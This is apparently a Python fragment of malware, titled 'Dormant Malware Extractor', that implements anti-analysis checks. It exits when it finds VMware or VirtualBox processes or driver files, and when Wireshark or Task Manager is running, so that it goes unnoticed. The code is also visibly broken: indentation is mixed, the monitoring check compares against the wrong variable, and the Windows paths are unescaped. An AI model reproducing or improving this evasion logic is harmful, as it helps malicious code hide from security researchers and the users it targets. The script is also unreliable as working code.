##Dormant Malware Extractor##
import psutil, os
from psutil import AccessDenied

print("Scanning for known VirtualMachine Processes...\n")
##Virtualmachine Process detection##
virmach = ["vmsrvc.exe", "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe", "vmwareuser.exe", "vmwarytray.exe", "vmupgradehelper.exe", "vmtoolsd.exe", "vmacthlp.exe"]
for proc in psutil.process_iter():
    for processes in virmach:
	    try:
			if proc.name().lower() == processes:
			    print("Found Process %s...exiting\n" % proc.name())
			    exit()
		    else:
				print("not here %s" % proc.name())
	    except AccessDenied:
			print("Couldn't read PID, Permission Error...\n")
		
print("Scnanning for VirtualMachine Drivers\n")
##Virtualmachine Driver and Wine Detection##
##Cannot figure how to implement os.path.exists to search through an array...Need to do!##
virpath1 = os.path.exists("C:\windows\system32\drivers\vmci.sys")
virpath2 = os.path.exists("C:\windows\system32\drivers\vmhgfs.sys")
virpath3 = os.path.exists("C:\windows\system32\drivers\vmmouse.sys")
virpath4 = os.path.exists("C:\windows\system32\drivers\vmscsi.sys")
virpath5 = os.path.exists("C:\windows\system32\drivers\vmusbmouse.sys")
virpath6 = os.path.exists("C:\windows\system32\drivers\vmx_svga.sys")
virpath7 = os.path.exists("C:\windows\system32\drivers\vmxnet.sys")
virpath8 = os.path.exists("C:\windows\system32\drivers\VBoxMouse.sys")
if virpath1 == True or virpath2 == True or virpath3 == True or virpath4 == True or virpath5 == True or virpath6 == True or virpath7 == True or virpath8 == True:
	print("Found VM Driver...Exiting")
	exit()
else:
	print("No VM Drivers detected\n")	
		
##Anti-Monitoring##...Less important that VM and Sandbox because a regular user may just be suspicious of loss in system resources##
print("Checking if we are being monitored...\n")
monitor = ["wireshark.exe", "taskmgr.exe"]
for mproc in psutil.process_iter():
	for processes2 in monitor:
		try:
			if mproc.name().lower() == monitor:
				print("Found Process %s...exiting\n" % mproc.name())
				exit()
			else:
				print("not here %s" % mproc.name())
		except AccessDenied:
			print("Couldn't read PID, Permission Error...\n")
